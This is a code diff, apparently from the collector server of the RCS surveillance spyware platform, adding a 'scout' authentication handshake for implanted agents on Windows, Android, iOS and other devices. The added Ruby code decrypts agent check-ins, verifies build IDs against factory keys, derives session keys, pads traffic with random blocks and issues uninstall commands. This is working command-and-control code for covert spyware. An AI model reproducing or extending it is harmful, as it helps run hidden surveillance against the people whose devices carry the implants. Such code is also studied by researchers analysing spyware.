@@ -16,6 +16,7 @@ require 'rcs-common/pascalize'
 require 'securerandom'
 require 'digest/sha1'
 require 'openssl'
+require 'base64'
 
 module RCS
 module Collector
@@ -25,10 +26,17 @@ class Protocol
   extend RCS::Crypt
   extend RCS::Collector::Commands
 
+  PLATFORMS = ["WINDOWS", "WINMO", "OSX", "IOS", "BLACKBERRY", "SYMBIAN", "ANDROID", "LINUX"]
+
+  def self.authenticate(peer, uri, content)
+    # choose between the correct authentication to use based on the packet size
+    content.length > 128 ? authenticate_scout(peer, uri, content) : authenticate_elite(peer, uri, content)
+  end
+
   # Authentication phase
   # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
   # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
-  def self.authenticate(peer, uri, content)
+  def self.authenticate_elite(peer, uri, content)
     trace :info, "[#{peer}] Authentication required for (#{content.length.to_s} bytes)..."
 
     # integrity check (104 byte of data, 112 padded)
@@ -156,6 +164,143 @@ class Protocol
     message += randblock() if hasRandBlock
 
     return message, 'application/octet-stream', cookie
+  end
+
+  # Authentication phase
+  # ->  Base64 ( Crypt_C ( Pver, Kd, sha(Kc | Kd), BuildId, InstanceId, Platform ) )
+  # <-  Base64 ( Crypt_C ( Ks, sha(K), Response ) )  |  SetCookie ( SessionCookie )
+  def self.authenticate_scout(peer, uri, content)
+    trace :info, "[#{peer}] Authentication scout required for (#{content.length.to_s} bytes)..."
+
+    # remove the base64 container
+    resp = Base64.decode64(content)
+
+    # align to the multiple of 16
+    resp, hasRand = normalize(resp)
+
+    begin
+      # decrypt the message
+      message = aes_decrypt(resp, DB.instance.agent_signature, RCS::Crypt::PAD_NOPAD)
+    rescue Exception => e
+      trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
+      return
+    end
+
+    pver = message.slice!(0..3).unpack('I')
+    if pver != [1]
+      trace :info, "[#{peer}] Invalid protocol version"
+    end
+
+    # first part of the session key, chosen by the client
+    # it will be used to derive the session key later along with Ks (server chosen)
+    # and the Cb (pre-shared conf key)
+    kd = message.slice!(0..15)
+    trace :debug, "[#{peer}] Auth -- Kd: " << kd.unpack('H*').to_s
+
+    sha = message.slice!(0..19)
+    trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s
+
+    # the build_id identification
+    build_id = message.slice!(0..15)
+    build_id_real = build_id.delete("\x00")
+    # substitute the first 4 chars with RCS_ because of the client side scrambling
+    build_id_real[0..3] = 'RCS_'
+    trace :info, "[#{peer}] Auth -- BuildId: " << build_id_real
+
+    # check that the ident is decrypted correctly (it only has RCS_ and numbers)
+    if Regexp.new('(RCS_)([0-9]{10})', Regexp::IGNORECASE).match(build_id_real).nil?
+      trace :error, "[#{peer}] Auth -- Invalid BuildId. Possible decryption issue."
+      return
+    end
+
+    # get the factory key from the db
+    conf_key = DB.instance.factory_key_of build_id_real
+
+    # this class does not exist
+    if conf_key.nil?
+      trace :warn, "[#{peer}] Factory key not found"
+      return
+    end
+
+    # the server will calculate the same sha digest and authenticate the agent
+    # since the conf key is pre-shared
+    sha_check = Digest::SHA1.digest(conf_key + kd)
+    trace :debug, "[#{peer}] Auth -- sha_check: " << sha_check.unpack('H*').to_s
+
+    # identification failed
+    unless sha.eql? sha_check then
+      trace :warn, "[#{peer}] Invalid identification"
+      return
+    end
+
+    trace :info, "[#{peer}] Authentication phase 1 completed"
+
+    # instance of the device
+    instance_id = message.slice!(0..19)
+    # remove the trailing zeroes from the strings
+    instance_id = instance_id.unpack('H*').first.downcase
+    trace :info, "[#{peer}] Auth -- InstanceId: " << instance_id
+
+    # platform of the device
+    platform = PLATFORMS[message.slice!(0).unpack('C').first]
+    trace :info, "[#{peer}] Auth -- platform: " << platform
+
+    demo = message.slice!(0).unpack('C')
+    trace :debug, "[#{peer}] Auth -- demo: " << demo.to_s
+    platform += "-DEMO" if demo.first == 1
+
+    scout = message.slice!(0).unpack('C')
+    trace :debug, "[#{peer}] Auth -- scout: " << scout.to_s
+    #TODO: propagate the SCOUT flag
+
+    flags = message.slice!(0).unpack('C')
+    trace :debug, "[#{peer}] Auth -- flags: " << flags.to_s
+
+    # random key part chosen by the server
+    ks = SecureRandom.random_bytes(16)
+    trace :debug, "[#{peer}] Auth -- Ks: " << ks.unpack('H*').to_s
+
+    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
+    # we use a schema like PBKDF1
+    k = Digest::SHA1.digest(conf_key + ks + kd)
+    trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s
+
+    # ask the database the status of the agent
+    status, bid = DB.instance.agent_status(build_id_real, instance_id, platform)
+
+    response = [Commands::PROTO_NO].pack('I')
+    # what to do based on the agent status
+    case status
+      when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
+        response = [Commands::PROTO_UNINSTALL].pack('I')
+        trace :info, "[#{peer}] Uninstall command sent (#{status})"
+        DB.instance.agent_uninstall(bid)
+      when DB::QUEUED_AGENT
+        response = [Commands::PROTO_NO].pack('I')
+        trace :warn, "[#{peer}] was queued for license limit exceeded"
+      when DB::ACTIVE_AGENT, DB::UNKNOWN_AGENT
+        # everything is ok or the db is not connected, proceed
+        response = [Commands::PROTO_OK].pack('I')
+
+        # create a valid cookie session
+        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, k, peer)
+
+        trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
+    end
+
+    # prepare the response:
+    message = ks + Digest::SHA1.digest(k + ks) + response + SecureRandom.random_bytes(8)
+
+    # complete the message for the agent
+    enc_msg = aes_encrypt(message, conf_key, RCS::Crypt::PAD_NOPAD)
+
+    # add the random block
+    enc_msg += SecureRandom.random_bytes(rand(128..1024))
+
+    # add the base64 container
+    enc_msg = Base64.encode64(enc_msg)
+
+    return enc_msg, 'application/octet-stream', cookie
   end
 
   def self.valid_authentication(peer, cookie)
